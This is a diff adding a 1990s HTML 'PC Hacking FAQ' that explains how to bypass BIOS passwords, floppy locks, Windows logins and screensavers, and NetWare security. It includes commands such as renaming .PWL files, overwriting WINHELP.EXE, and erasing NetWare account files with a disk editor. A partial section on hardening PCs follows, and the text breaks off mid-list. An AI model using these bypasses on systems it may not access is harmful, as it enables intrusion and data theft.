@@ -1,0 +1,864 @@
+<html>
+<head>
+<title>STANDSEC</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+</head>
+
+<body bgcolor="#FFFFFF" text="#000000">
+<table width="680" border="0" cellspacing="2" cellpadding="2" align="center">
+  <tr> 
+    <td width="693"> 
+      <pre>
+                        :::::::::   ::::::::  :::::::::  :::::::::: 
+                        :+:    :+: :+:    :+: :+:    :+: :+:        
+                        +:+    +:+ +:+        +:+    +:+ +:+        
+                        +#++:++#+  +#++:++#++ +#++:++#:  :#::+::#   
+                        +#+    +#+        +#+ +#+    +#+ +#+        
+                        #+#    #+# #+#    #+# #+#    #+# #+#        
+                        #########   ########  ###    ### ###  </pre>
+      <p><br>
+        <br>
+      </p>
+      <pre>              	             <a href="http://blacksun.box.sk" target="_blank">http://blacksun.box.sk</a>
+                           _____________________________
+    ______________________I       <b>   Topic:</b>             I_____________________
+   \                      I                             I                    /
+    \     HTML by:        I     <b>The PC Hacking FAQ</b>      I   Written by:     /
+    >                     I                             I                  < 
+   /      <a href="mailto:black_mesa@gmx.de">Martin L.</a>       I_____________________________I   <a href="mailto:olcay@libtech.com">Olcay Cirit</a>     \
+  /___________________________>                    <_________________________\</pre>
+    </td>
+  </tr>
+</table>
+<p>Version 1.5 3/17/96<br>
+  Appendix by <a href="mailto:Njan@anrki.com">Njan</a> 18/09/9</p>
+<hr width="50%" align="left">
+Written By <a href="mailto:olcay@libtech.com">Olcay Cirit</a>
+<hr width="50%" align="left">
+<br>
+<p><br>
+  <font size="4"><b>Table of Contents</b></font></p>
+<ul>
+  <li><a href="#1">X. Introduction</a></li>
+  <li><a href="#2">1. Hardware and Firmware </a> 
+    <ul>
+      <li><a href="#3">a. The BIOS </a>
+<ul>
+          <li><a href="#4">Passwords</a></li>
+          <li><a href="#5">Resetting the CMOS</a></li>
+        </ul>
+      </li>
+      <li><a href="#6">b. Floppy Locks </a> 
+        <ul>
+          <li><a href="#7">Picking Them</a></li>
+          <li><a href="#8">Buying them</a></li>
+        </ul>
+      </li>
+      <li><a href="#9">c. Last Resorts </a> 
+        <ul>
+          <li><a href="#10">Hard Disk Extraction</a></li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li><a href="#11">2. DOS, Windows, and Netware </a> 
+    <ul>
+      <li><a href="#12">a. Getting access to DOS </a> 
+        <ul>
+          <li><a href="#13">Boot from a floppy disk</a></li>
+          <li><a href="#14">Bypass startup files</a></li>
+          <li><a href="#15">Bypass DriveSpace</a></li>
+          <li><a href="#16">Break out of Autoexec.bat</a></li>
+        </ul>
+      </li>
+      <li><a href="#17">b. Getting to DOS from Windows </a> 
+        <ul>
+          <li><a href="#18">Password Protection </a> 
+            <ul>
+              <li><a href="#19">Windows Login</a></li>
+              <li><a href="#20">Third-Party Passwords</a></li>
+              <li><a href="#21">Screensavers</a></li>
+            </ul>
+          </li>
+          <li><a href="#22">Windows-Based Security </a> 
+            <ul>
+              <li><a href="#23">DOS Through OLE</a></li>
+              <li><a href="#24">DOS Using Write</a></li>
+              <li><a href="#25">DOS Using Word</a></li>
+              <li><a href="#26">DOS through MODE</a></li>
+              <li><a href="#27">DOS through Windows Login</a></li>
+            </ul>
+          </li>
+        </ul>
+      </li>
+      <li><a href="#28">c. Getting Past Netware </a> 
+        <ul>
+          <li><a href="#29">Common Account Names</a></li>
+          <li><a href="#30">Resetting Netware</a></li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+  <li><a href="#31">3. Building a SECURE system </a>
+<ul>
+      <li><a href="#32">a. Understanding the Issues </a> 
+        <ul>
+          <li><a href="#33">Potential &quot;Hackers&quot;</a></li>
+          <li><a href="#34">Physical Security</a></li>
+          <li><a href="#35">Software Security</a> <a href="#37">(+ link to appendix)</a></li>
+          <li><a href="#36">Passwords</a></li>
+        </ul>
+      </li>
+    </ul>
+    
+  <li><a href="#37">4. Appendix. &lt;Njan&gt;</a></li>
+</ul>
+<hr align="left" width="400">
+<p><b><font size="4"><a name="1"></a>X. Introduction</font></b></p>
+<p>This FAQ describes how to break-in to a PC (IBM-Compatible) from the outside 
+  in, and how to bypass some common software-based security measures. The last 
+  section details how to secure your PC against most of such attacks.</p>
+<p>Many of these solutions assume you have physical access to the PC. For example, 
+  you can't extract the hard disk or reset the CMOS over a network, but you can 
+  do it if you have access to the computer.</p>
+<p><b><font size="4"><a name="2"></a>1. Hardware and Firmware</font></b></p>
+<p><font size="4"><b><a name="3"></a>1a. The BIOS</b></font></p>
+<p><font size="4"><b><a name="4"></a>Passwords</b></font><br>
+  <br>
+  The BIOS, short for Basic Input/Output Services, is the control program of the 
+  PC. It is responsible for starting up your computer, transferring control of 
+  the system to the operating system, and for handling other low-level functions, 
+  such as disk access.</p>
+<p>NOTE that the BIOS is not a software program, insofar as it is not purged from 
+  memory when you turn off the computer. It's firmware, meaning it is permanently 
+  and unchangeably stored in the machine. FLASH BIOS Systems, such as those from 
+  Phoenix and AMI, allow you update the BIOS through software, but that's another 
+  FAQ.</p>
+<p>A convenient little feature that most BIOS manufacturers include is a startup 
+  password. This prevents access to the system until you enter the correct password. 
+</p>
+<p>If you can get access to the system after the password has been entered, then 
+  there is a software-based BIOS password extractor available from:</p>
+<p><a href="ftp://oak.oakland.edu/simtel/msdos/sysutil/amis2990.zip">ftp://oak.oakland.edu/simtel/msdos/sysutil/amis2990.zip</a></p>
+<p><br>
+  <font size="4"><b><a name="5"></a>Resetting the CMOS</b></font><br>
+  <br>
+  There is only one other way to get past the BIOS password. It involves discharging 
+  the static memory (CMOS) used to store the password and other system information. 
+  Once it is discharged, however, you have to reset all the system settings by 
+  hand.</p>
+<p>****Follow these steps:</p>
+<ol>
+  <li>Start up the computer a. If the system allows it, enter the Setup Screen 
+    (Usually by pressing F1, DEL or INS during the memory check)</li>
+  <li>Record all the Setup Information. Double Check.</li>
+  <li>Turn off the computer</li>
+  <li>Remove the casing, and put the computer on the ground in such a way that 
+    you can see and access the side of the motherboard with the processor on it.</li>
+  <li> Look at the motherboard</li>
+  <li>If you can see a round, disc-like battery, then remove it, and let the computer 
+    sit without the battery for 15-30 minutes. Put the battery back in.</li>
+  <li>If you have access to the circuit diagrams for the motherboard, look in 
+    there for the password or CMOS jumper. Flip it on and off.</li>
+  <li>Look for a blue, soldered-in battery with a jumper running off of it. This 
+    jumper is for connecting an external battery. Pull it out for 15-30 min. to 
+    reset the CMOS.</li>
+  <li>Replace the computer casing.</li>
+  <li> Enter the Setup Screen, and set the Setup Information back to the original 
+    values that you (hopefully) recorded. </li>
+</ol>
+<p>If you were unable to record the setup info, then you'll just have to set it 
+  up manually. Some newer Plug &amp; Play BIOSes have an autodetect feature that 
+  automatically sets-up the hard disk and other items.</p>
+<p>Again, I would like to mention that there are numerous password extractors 
+  available for free off the internet and on BBSes. Try those first: they are 
+  much cleaner and easier-to-use.</p>
+<hr>
+<p><font size="4"><b><a name="6"></a>1b. Floppy Locks</b></font></p>
+<p>Floppy Locks are generally cheap plastic inserts that hook on to the inside 
+  of the drive and lock it, thereby preventing you from using the floppy drive. 
+  The locks used are usually those little swivel locks used in computer casings 
+  to lock the keyboard.</p>
+<p>There ARE some very secure locks, with *unique* keys. Such locks are not sold 
+  at your local computer store, and must be obtained directly from a factory in 
+  Nice, France (didn't get the name, though.). There is a distributor in Canada 
+  by the name of &quot;Kappa Micro&quot;.</p>
+<p>If the lock is of the swivel type, you can either pick it, or buy a key (they're 
+  all the same).</p>
+<p><a name="7"></a>To pick it, you'll need a *thin* flathead screwdriver or a 
+  paperclip. To pick the lock, take the paperclip and insert it into the little 
+  notch on the inside of the swivel lock. Now, pull to the opposite side of the 
+  lock until the swivel is in the unlocked position.</p>
+<p><a name="8"></a>If you choose to buy a key, you can:</p>
+<p> A. Go to your local computer service center, and buy one of these keys. (Very 
+  cheap. Often less than<br>
+  $0.75) B. Buy the same brand of floppy lock, and use the key that comes with 
+  it.</p>
+<hr>
+<p><font size="4"><b><a name="9"></a>1c. Last Resorts</b></font></p>
+<p>If you are *REALLY* desperate to access this PC, then the following *might* 
+  work:</p>
+<ol>
+  <li><a name="10"></a>Remove the PC Casing</li>
+  <li>Extract the hard disk (By unscrewing and disconnecting)</li>
+  <li>Transfer it to another computer. (Make sure that it is NOT set as the boot 
+    drive.)</li>
+  <li>Start up this computer, and access the hard disk from there.</li>
+</ol>
+<p>This will probably not work if an encrypted file system is in use. The only 
+  way to access such disks is to enter the password, or figure out a way to decrypt 
+  it, so if you forget your password, you're hosed. :(</p>
+<hr>
+<p><font size="4"><b><a name="11"></a>2. DOS, Windows, and Netware</b></font></p>
+<p><font size="4"><b><a name="12"></a>2a. Getting access to DOS</b></font></p>
+<p>Some systems, are set up to boot directly to some sort of shell/security program, 
+  like Windows, or Windows 95. If you want to get access to a DOS prompt, you 
+  have some choices:</p>
+<ol>
+  <li>Boot from a floppy disk</li>
+  <li>Bypass startup files</li>
+  <li>Bypassing DriveSpace</li>
+  <li> Break out of Autoexec.bat</li>
+</ol>
+<p> <a name="13"></a>***Booting from a floppy requires you to create a system 
+  disk. You can do this using the DOS command FORMAT A: /S which will format a 
+  disk and place system files on it. Also, the Windows format (In File Manager 
+  or Explorer) has an option allowing you to create a system floppy.</p>
+<p>Before you create a system disk, you must determine which floppy drive is used 
+  to boot. If the system has both a 1.2MB (5.25&quot;) Floppy Drive and a 1.44MB 
+  (3.5&quot;) Drive, it is likely that the boot drive is the 1.2 MB floppy drive. 
+  If the computer has only one floppy drive, it is quite safe to assume that it 
+  is the boot drive.</p>
+<p>However, if you are unsure as to which drive is the boot drive, you can either 
+  find out by entering System Setup (as described in section 1) or by observing 
+  which floppy drive is read right before the operating system loads.</p>
+<p>If the system is set to boot only from the hard disk, then you can refer to 
+  Section 1 on how to reset the CMOS.</p>
+<p>Once you have a system disk, you place it in the floppy drive, and turn on 
+  or reset the computer. If you have done everything right, the computer will 
+  boot from the floppy drive and you will have access to a DOS prompt.</p>
+<p>This technique, of course, can be prevented through the use of a floppy lock, 
+  and by setting the BIOS to boot only from the hard disk.</p>
+<p><a name="14"></a>***Bypassing startup files is quite simple, but only works 
+  on versions of DOS 6.0 or better and Windows 95. When you turn on the computer 
+  and you see the text:</p>
+<p> Starting MS-DOS ...</p>
+<p>or<br>
+  Starting PC-DOS ...</p>
+<p>or <br>
+  Starting Windows 95 ...</p>
+<p>Press and hold the SHIFT or F5 key IMMEDIATELY. This will bypass the startup 
+  files (CONFIG.SYS and AUTOEXEC.BAT) as long as the system administrator has 
+  not disabled this feature.</p>
+<p>Additionally, you can press and hold F8 when the startup text shows to enter 
+  the Boot menu. This lets you selectively disable certain commands, or bypass 
+  the startup files totally, among other things.</p>
+<p><a name="15"></a>***Bypassing DriveSpace works if compression software such 
+  as DriveSpace or DoubleSpace has been installed. If so, when the startup text 
+  displays, press and hold Ctrl+F5 or Ctrl+F8. This will load the system without 
+  loading the compression driver, which means you can't access the files on disk. 
+</p>
+<p>HOWEVER, you *can* decompress the disk (DriveSpace only), as long as you have 
+  sufficient disk space or enough floppies. </p>
+<p>If all else fails, you can format it or take it to a Specialized Data Recovery 
+  service. They can probably recover the files by moving them to a larger hard 
+  disk and decompressing. </p>
+<p><a name="16"></a>***Breaking out of AUTOEXEC.BAT is rather simple also. When 
+  the computer starts up and the operating system starts loading, press Ctrl+Break 
+  (Or Ctrl+C) repeatedly. When the AUTOEXEC.BAT executes, this will terminate 
+  it and drop you to DOS. This will work unless the keyboard has been disabled, 
+  or is inactive during initialization (Drivers can be loaded in CONFIG.SYS which 
+  temporarily disable the keyboard, and then re-enable it with a command at the 
+  end of AUTOEXEC.BAT)</p>
+<hr>
+<p><font size="4"><b><a name="17"></a>2b. Getting to DOS from Windows</b></font></p>
+<p>If the above tactics fail, and the machine automatically loads Windows, then 
+  you still have a very good chance of getting to DOS. Since Windows by default 
+  gives you free access to DOS, there are special security programs made specifically 
+  to prevent the user from accessing it, among other things. Most of these programs 
+  can be bypassed.</p>
+<p><font size="4"><b><a name="18"></a>Password Protection</b></font><br>
+  <br>
+  If when Windows starts up you are presented with yet another password dialog 
+  box, analyze the situation:</p>
+<p><font size="3"><b><a name="19"></a>Windows Login</b></font><br>
+  <br>
+  If this is the Primary Windows Login or a Network login, then you can get past 
+  it by pressing the Cancel button (No Joke!) to log on as the Default user. This 
+  is because the Login information is used primarily for desktop preferences and 
+  remote file sharing.</p>
+<p>the Default user, however, can be secured. If this is done, then it is virtually 
+  impossible to gain access through it. The only way to do this is by a series 
+  of registry entries, which are listed in the appendix at the bottom of this 
+  file.</p>
+<p>Login passwords are stored in .PWL files in the Windows directory. You can 
+  reset all accounts to no password by using the .PWL renaming technique described 
+  below. </p>
+<p>The filename of the .PWL file corresponds to the login name of that user. For 
+  example, Olcay.pwl contains the encrypted passwords for the account &quot;Olcay&quot;.</p>
+<p>The password protection in Windows 95 uses a much stronger algorithm, but you 
+  can still bypass it by *carefully* moving or renaming all .PWL files in the 
+  C:\Windows directory. The password filenames are also stored in the SYSTEM.INI 
+  file.</p>
+<p>So, to disable passwords:</p>
+<p> CD \WINDOWS<br>
+  REN *.PWL *.PW_</p>
+<p>Similarly, to re-enable passwords:</p>
+<p> CD \WINDOWS<br>
+  REN *.PW_ *.PWL</p>
+<p></p>
+<p><b><font size="3"><a name="20"></a>Third-Party Password</font></b><br>
+  <br>
+  If this is a third-party security program, such as the one built-in to After 
+  Dark, try pressing Ctrl+Alt+Del when the dialog is presented to you. Most security 
+  programs go out of their way to be secure, and Windows 3.1 interprets this as 
+  not responding to the system, and thus will allow you close it. Windows 95 pops 
+  up a neat little dialog box that lets you terminate any running application. 
+  How convenient. :) Once you subvert this, you can prevent it from bothering 
+  you again by editing the LOAD= and RUN= sections in C:\WINDOWS\WIN.INI.</p>
+<p><br>
+  <font size="3"><b><a name="21"></a>Screensavers</b></font><br>
+  <br>
+  The password protection built-in to the Windows 3.1 screensavers is extremely 
+  weak. You can bypass it by editing CONTROL.INI and searching for the Password 
+  field. Delete the junk that appears after the equal sign (This is an encrypted 
+  password).</p>
+<p>To disable Windows 95 passwords, right-click on the desktop and select Properties, 
+  choose the Screen Saver tab, and uncheck &quot;Password protected&quot;.</p>
+<p></p>
+<p><br>
+  <font size="4"><b><a name="22"></a>Windows-Based Security</b></font><br>
+  <br>
+  If Windows starts up, and Program Manager loads, but the File menu is disabled, 
+  and access to DOS has been cut off, or some other oppressive security measures 
+  are in place, fear not. There are ways around such programs, as shall be explained 
+  below:</p>
+<p><br>
+  <b><font size="3"><a name="23"></a>DOS through OLE</font></b><br>
+  <br>
+  OLE, for Object Linking and Embedding, was hailed as a great advance in the 
+  Windows Operating System by letting you embed or link objects (this includes 
+  Executables) in documents.</p>
+<p>Scorpion pointed out that Object Packager, which lets you package embedded 
+  files with icons, could be used to access DOS (or run any program) from most 
+  OLE-enabled applications (Like Write, WordPad, Word, etc.) Based on this information, 
+  I found a similar hole that doesn't require Object Packager but still exploits 
+  OLE. Both of these work in Windows 3.x and up.</p>
+<p>Using Object Packager:</p>
+<ol>
+  <li>Start up Write or WordPad</li>
+  <li>Select &quot;Object&quot; from the &quot;Insert&quot; menu</li>
+  <li>The location of the Insert Object command may vary. Look Around.</li>
+  <li>Choose Package from the list, and click OK</li>
+  <li>Select &quot;Import&quot; from the &quot;File&quot; menu</li>
+  <li> Enter C:\COMMAND.COM, and select OK</li>
+  <li>Select &quot;Update&quot; Under the &quot;File&quot; menu</li>
+  <li>Go back to your document, and double click on the COMMAND.COM icon</li>
+</ol>
+<p>Using Insert:</p>
+<ol>
+  <li>Start up Write or WordPad</li>
+  <li>Select &quot;Object&quot; from the &quot;Insert&quot; menu</li>
+  <li>Again, the location of the Insert Object command may vary. Look Around.</li>
+  <li>Select &quot;Create from File&quot;</li>
+  <li>Enter C:\COMMAND.COM as the filename</li>
+  <li>Click OK, go back to your document, and double click on the COMMAND.COM 
+    icon<br>
+  </li>
+</ol>
+<p><font size="3"><b><a name="24"></a>DOS through Write</b></font><br>
+  <br>
+  This works by saving COMMAND.COM, the DOS executable, over WINHELP.EXE, the 
+  Windows Help program. Unfortunately, this tactic will not work with Windows 
+  95. WordPad, the Word Processing Applet that comes with Windows 95, prevents 
+  the user from loading executable files.</p>
+<ol>
+  <li>Go into Accessories, and start up Write (*NOT* NOTEPAD!!)</li>
+  <li>Open C:\COMMAND.COM</li>
+  <li>A dialog box will pop up. Select &quot;NO CONVERSION&quot;</li>
+  <li>Select Save As...</li>
+  <li>Save it as C:\WINDOWS\WINHELP.EXE</li>
+  <li>If it asks if you want to overwrite WINHELP.EXE, choose YES</li>
+  <li>Press F1. Normally, this loads Windows Help, but now it will create a DOS 
+    prompt window.</li>
+</ol>
+<p></p>
+<p></p>
+<p><b><font size="3"><a name="25"></a>DOS through Word</font></b><br>
+  <br>
+  Microsoft Word versions 6.0 and above have a built-in macro language called 
+  WordBasic. This example works by instructing WordBasic to open up a DOS window.</p>
+<p>Most of the Macro languages of popular applications let you do something similar 
+  to this technique. Look around in the online help files.</p>
+<ol>
+  <li>If Microsoft Word is installed, start it up.</li>
+  <li>From the Tools Menu, select Macro.</li>
+  <li>Type in a Macro name, and click &quot;Create&quot;</li>
+  <li>When the Macro window comes up, type in one of the following depending on 
+    which Windows you are using:<br>
+    For Windows 3.1: Shell Environ$(&quot;COMSPEC&quot;) <br>
+    For Windows 95: Shell Environ$(&quot;COMMAND&quot;) <br>
+    For Windows NT: Shell Environ$(&quot;CMD&quot;)<br>
+    <br>
+    If all else fails: Shell &quot;C:\COMMAND.COM&quot;</li>
+  <li>Run the macro by pressing the little play button on the macro toolbar. This 
+    will launch a DOS prompt.</li>
+</ol>
+<p><font size="3"><b><a name="26"></a>DOS through MODE</b></font><br>
+  <br>
+  When Windows 95 Shuts Down and shows that dumb graphic, it's really just sitting 
+  on top of DOS. You can actually issue DOS commands (although the graphic will 
+  cover them) on the system after shutdown!!!</p>
+<p>A simple way to do this is to type:</p>
+<p> CLS</p>
+<p>After the shutdown graphic shows. However, the text will be in 40-column mode, 
+  which is hard to read, and incompatible with some programs.</p>
+<p>If you want to get a nice, clean DOS prompt, you can type:</p>
+<p> MODE CO80</p>
+<p>This will reset the screen display to the normal (80-column, 16 color) DOS 
+  display mode.</p>
+<p>*MOST* Windows Security programs are based on a VxD (Virtual Device), which 
+  gives them unprecented power over the system while Windows is running. After 
+  shutdown, all Windows-based programs will be unloaded, leaving you free to explore 
+  using DOS.</p>
+<p>For some unknown reason, this doesn't seem to work on some systems.</p>
+<p></p>
+<p><br>
+  <b><font size="3"><a name="27"></a>DOS through Windows Login</font></b><br>
+  <br>
+  When Windows 95 Starts up, some systems are set up to show a Windows/Network 
+  Login dialog box. You can press either</p>
+<p> Ctrl+Alt+Del</p>
+<p>Which will let you Shut down the system (and apply the DOS THROUGH MODE technique), 
+  End any running tasks, etc. Or:</p>
+<p> Ctrl+Esc</p>
+<p>Which, since the taskbar hasn't loaded, will launch Task Manager. From this 
+  window you can end tasks, run programs, and shutdown the system (again, the 
+  DOS THROUGH MODE technique is applicable here). *All* programs are accessible 
+  from the run menu, so you can run C:\COMMAND.COM to get access to DOS.</p>
+<hr>
+<p></p>
+<p><b><font size="4"><a name="28"></a>2c. Getting past NetWare</font></b></p>
+<p>This section is based on excerpts from the Netware Hacking FAQ. Although Netware 
+  has met a general decline in use over the years, I still thought it would be 
+  proper to include this.</p>
+<p><font size="4"><b><a name="29"></a>Common Account Names</b></font><br>
+  <br>
+  Novell Netware has the following default accounts: SUPERVISOR, GUEST, and Netware 
+  4.x has ADMIN and USER_TEMPLATE as well. All of these have no password set. 
+  Don't be a dummy, password protect SUPERVISOR and ADMIN immediately. Below is 
+  a listing of common default and built-in accounts that might be in your best 
+  interest to secure.</p>
+<table width="60%" border="1">
+  <tr> 
+    <td valign="top"> 
+      <div align="center"><b>Account </b></div>
+    </td>
+    <td> 
+      <p align="center"><b>Purpose</b></p>
+    </td>
+  </tr>
+  <tr> 
+    <td valign="top">POST</td>
+    <td>Attaching to a second server for email</td>
+  </tr>
+  <tr> 
+    <td valign="top"> 
+      <p>MAIL</p>
+    </td>
+    <td>&nbsp;</td>
+  </tr>
+  <tr> 
+    <td valign="top">PRINT</td>
+    <td>Attaching to a second server for printing</td>
+  </tr>
+  <tr> 
+    <td valign="top">LASER</td>
+    <td>&nbsp;</td>
+  </tr>
+  <tr> 
+    <td valign="top">HPLASER</td>
+    <td>&nbsp;</td>
+  </tr>
+  <tr> 
+    <td valign="top">PRINTER</td>
+    <td>&nbsp;</td>
+  </tr>
+  <tr> 
+    <td valign="top"> 
+      <p>LASERWRITER</p>
+    </td>
+    <td>&nbsp;</td>
+  </tr>
+  <tr> 
+    <td valign="top">ROUTER</td>
+    <td> 
+      <p>Attaching an email router to the server</p>
+    </td>
+  </tr>
+  <tr> 
+    <td valign="top">BACKUP</td>
+    <td>May have password/station restrictions (see below), </td>
+  </tr>
+  <tr> 
+    <td valign="top">WANGTEK</td>
+    <td>used for backing up the server to a tape unit attached to the workstation. 
+      For complete backups, <br>
+      Supervisor equivalence is required.</td>
+  </tr>
+  <tr> 
+    <td valign="top">TEST</td>
+    <td>
+      <p>A test user account for temp use</p>
+    </td>
+  </tr>
+  <tr> 
+    <td valign="top">ARCHIVIST</td>
+    <td>
+      <p>Palindrome default account for backup</p>
+    </td>
+  </tr>
+  <tr> 
+    <td valign="top">CHEY_ARCHSVR</td>
+    <td>An account for Arcserve to login to the server from from the console for 
+      tape backup. Version 5.01g's password was WONDERLAND.</td>
+  </tr>
+  <tr> 
+    <td valign="top">GATEWAY</td>
+    <td>Attaching a gateway machine to the server</td>
+  </tr>
+  <tr> 
+    <td valign="top">
+      <p>GATE</p>
+    </td>
+    <td>&nbsp;</td>
+  </tr>
+  <tr> 
+    <td valign="top">FAX</td>
+    <td>Attaching a dedicated fax modem unit to the network</td>
+  </tr>
+  <tr> 
+    <td valign="top">FAXUSER </td>
+    <td>&nbsp;</td>
+  </tr>
+  <tr> 
+    <td valign="top">
+      <p>FAXWORKS </p>
+    </td>
+    <td>&nbsp;</td>
+  </tr>
+  <tr> 
+    <td valign="top">
+      <p> </p>
+      <p>WINDOWS_PASSTHRU</p>
+</td>
+    <td>Although not required, per the Microsoft Win95 Resource Kit, Ch. 9 pg. 
+      292 and Ch. 11 pg. 401 you need this for resource sharing without a password.</td>
+  </tr>
+</table>
+<p><font size="4"><b><a name="30"></a>Resetting Netware</b></font><br>
+  <br>
+  When NetWare is first installed, the account SUPERVISOR and GUEST are left unprotected, 
+  that is, with no password. SUPERVISOR has free run of the system. You can do 
+  anything you want.</p>
+<p>But how can you make the server think it has just been installed without actually 
+  reinstalling the server and losing all data on the disk? Simple. You just delete 
+  the files that contain the security system! </p>
+<p>In Netware 2.x, all security information is stored in two files (NET$BIND.SYS 
+  and NET$BVAL.SYS). Netware 3.x stores that information in three files (NET$OBJ.SYS, 
+  NET$VAL.SYS and ET$PROP.SYS). The all new Netware 4.x system stores all login 
+  names and passwords in five different files (PARTITIO.NDS, BLOCK.NDS, ENTRY.NDS, 
+  VALUE.NDS and UNINSTAL.NDS [This last file may not be there, don't worry]).</p>
+<p>Although Novell did a very good job encrypting passwords, they left all directory 
+  information easy to find and change if you can access the server's disk directly, 
+  using common utilities like Norton's Disk Edit. </p>
+<p>Using this utility as an example, I'll give a step-by-step procedure to make 
+  these files vanish. All you need is a bootable DOS disk, Norton Utilities' Emergency 
+  Disk containing the DiskEdit program and some time near the server.</p>
+<ol>
+  <li>Boot the server and go to the DOS prompt. To do this, just let the network 
+    boot normally and then use the DOWN and EXIT commands. This procedure does 
+    not work on old Netware 2.x servers and in some installations where DOS has 
+    been removed from memory. In those cases, you'll have to use a DOS bootable 
+    disk.</li>
+  <li>Run Norton's DiskEdit utility from drive A:</li>
+  <li>Select &quot;Tools&quot; in the main menu and then select &quot;Configuration&quot;. 
+    At the configuration window, uncheck the &quot;Read-Only&quot; checkbox. And 
+    be very careful with everything you type after this point.</li>
+  <li>Select &quot;Object&quot; and then &quot;Drive&quot;. At the window, select 
+    the C: drive and make sure you check the button &quot;physical drive&quot;. 
+    After that, you'll be looking at your physical disk and you be able to see 
+    <br>
+    (and change) everything on it.</li>
+  <li> Select &quot;Tools&quot; and then &quot;Find&quot;. Here, you'll enter 
+    the name of the file you are trying to find. Use &quot;NET$BIND&quot; for 
+    Netware 2, &quot;NET$PROP.SYS&quot; for Netware 3 and &quot;PARTITIO.NDS&quot; 
+    for Netware 4. It is possible that you find these strings in a place that 
+    is not the Netware directory. If the file names are not all near each other 
+    and proportionaly separated by some unreadable codes (at least 32 bytes between 
+    them), then you it's not the place we are looking for. In that case, you'll 
+    have to keep searching by selecting &quot;Tools&quot; and then &quot;Find 
+    again&quot;. [In Netware 3.x, you can change all occurences of the bindery 
+    files and it should still work okay])</li>
+  <li>You found the directory and you are ready to change it. Instead of deleting 
+    the files, you'll be renaming them. This will avoid problems with the directory 
+    structure (like lost FAT chains). Just type &quot;OLD&quot; over the existing 
+    &quot;SYS&quot; or &quot;NDS&quot; extension. Be extremely careful and don't 
+    change anything else.</li>
+  <li>Select &quot;Tools&quot; and then &quot;Find again&quot;. Since Netware 
+    store the directory information in two different places, you have to find 
+    the other copy and change it the same way. This will again prevent directory 
+    structure problems.</li>
+  <li>Exit Norton Disk Edit and boot the server again. If you're running Netware 
+    2 or 3, your server would be already accessible. Just go to any station and 
+    log in as user Supervisor. No password will be asked. If you're running Netware 
+    4, there is one last step.</li>
+  <li>Load Netware 4 install utility (just type LOAD INSTALL at the console prompt) 
+    and select the options to install the Directory Services. You be prompted 
+    for the Admin password while doing this. After that, you may go to any station 
+    and log in as user Admin, using the password that you have selected.</li>
+</ol>
+<p>**NOTE: If Disk Edit is unavailable, any Disk Editing utility with searching 
+  capabilities will suffice.</p>
+<hr>
+<p><br>
+  <b><font size="4"><a name="31"></a>3. Building a SECURE System</font></b></p>
+<p><font size="4"><b><a name="32"></a>3a. Understanding the Issues</b></font></p>
+<p><font size="3"><b><a name="33"></a>Potential &quot;Hackers&quot;</b></font><br>
+  <br>
+  After reading this FAQ, you've probably revised your idea of a secure PC quite 
+  a bit. Truth be told, IBM didn't design the Personal Computer with security 
+  in mind. Back in 1980, their main objective was to get _something_ to market 
+  before Apple gobbled up all the market share.</p>
+<p>After awhile, security programs started to emerge that attempted to bridge 
+  this gap. These were quite popular, and were put into use by many companies 
+  to prevent 'curious' employees from messing with<br>
+  the computers.</p>
+<p>However, ways to bypass these security programs were quickly found. As long 
+  as computers are designed for convenience, and with humans in mind, this will 
+  almost always happen.</p>
+<p>So, who are potential &quot;Hackers&quot;? The answer is: Anyone. Experienced 
+  users especially, but even newbies sometimes find weak spots. This is not to 
+  say that everyone *is* a &quot;hacker&quot;. (Note that I use quotes because 
+  I don't believe in the popular usage of the term &quot;Hacker&quot;. The media 
+  is out of control: their usage of the word has conflated Computer Gurus with 
+  Criminals in the minds of the people.)</p>
+<p>As always, prevention is the best medicine. The following sections deal with 
+  how to secure your system, both through physical and software-based means.</p>
+<p></p>
+<p><b><font size="3"><a name="34"></a>Physical Security</font></b><br>
+  <br>
+  In the old days, back when computers filled multiple rooms, the security of 
+  a system was basically all physical: Locks, security guards, etc. Now the emphasis 
+  has shifted away from physical security, and is leaning more towards software-based 
+  methods. However, in some cases, a certain degree of physical security is in 
+  order.</p>
+<p>***If you want to prevent people from resetting your CMOS and accessing the 
+  floppy drives, etc. you have to secure the system itself. This can be done by 
+  having the computer in a locked room, leaving only the screen and keyboard accessible. 
+  There are many products which let you extend the reach of screen and keyboard 
+  cables. Even some that let you control many different computers using one screen. 
+</p>
+<p>***There are also security devices available made by companies such as Anchor 
+  Pad, Lucasey, and others that completely enclose the PC. These are devices such 
+  as lockdown pads, cables for monitors, and metal boxes. There are also devices 
+  that cover and lock the floppy and CD-ROM slots. </p>
+<p>***Computer locks which bind your computer to a desk are good for discouraging 
+  theft.</p>
+<p>***To protect your hard disk data, I would suggest investing in a removable 
+  media system that lets you &quot;hot-swap&quot; and lock hard disks. The hard 
+  disk could then be easily removed (with the *unique* key) and stored in a safe 
+  to prevent theft of data. Drives such as the Zip (100MB), Ditto (800MB), and 
+  Jaz (1GB) are removable as well, but do not lock. </p>
+<p>Make sure that you test the computer immediately after these lockdown devices 
+  are installed. In some instances the stress induced on the casing by the devices 
+  can cause certain parts to malfunction.</p>
+<p>***You can buy devices that prevent the PC electrical cord from being unplugged 
+  or turned on without a key.</p>
+<p>***Investing in a UPS (Uninterruptable Power Supply) System is worth the cost. 
+  These protect against power fluxes which can damage your system. In the case 
+  of a power out (or if someone trips over the cord), UPS systems give you 5 minutes 
+  of rechargeable battery power to save work and perform an emergency shutdown.</p>
+<p>***As one last measure of security, it's always nice to invest in some insurance 
+  for your computer. It won't get your data back, but it *will* give you some 
+  peace of mind.</p>
+<p></p>
+<p><font size="3"><b><a name="35"></a>Software-Based Security</b></font><br>
+  <br>
+  Below is a list of measures you can take to secure your system using software/firmware 
+  based methods. They are listed in order of increasing security, so minimum security 
+  would be only implementing option #1, maximum security would be implementing 
+  #1-8. Keep in mind that implementing any of these without implementing every 
+  item below it leaves possible entry points open.</p>
+<ol>
+  <li>Set up a BIOS password for both the Setup screen *and* access to the system.</li>
+  <li>Make sure the password is not easily guessable (i.e., birthdate, name backwards, 
+    etc. are<br>
+    easily guessed) See next section.</li>
+  <li>Make sure that the password is the maximum possible number of characters 
+    supported by the BIOS.</li>
+  <li>Disable floppy booting from within the BIOS</li>
+  <li>Disable Bypass of startup files</li>
+  <li>This is done by adding the line:<br>
+    SWITCHES=/F /N<br>
+    to the CONFIG.SYS file.</li>
+  <li>Additionally, you might want to precede all statements in the Autoexec.bat 
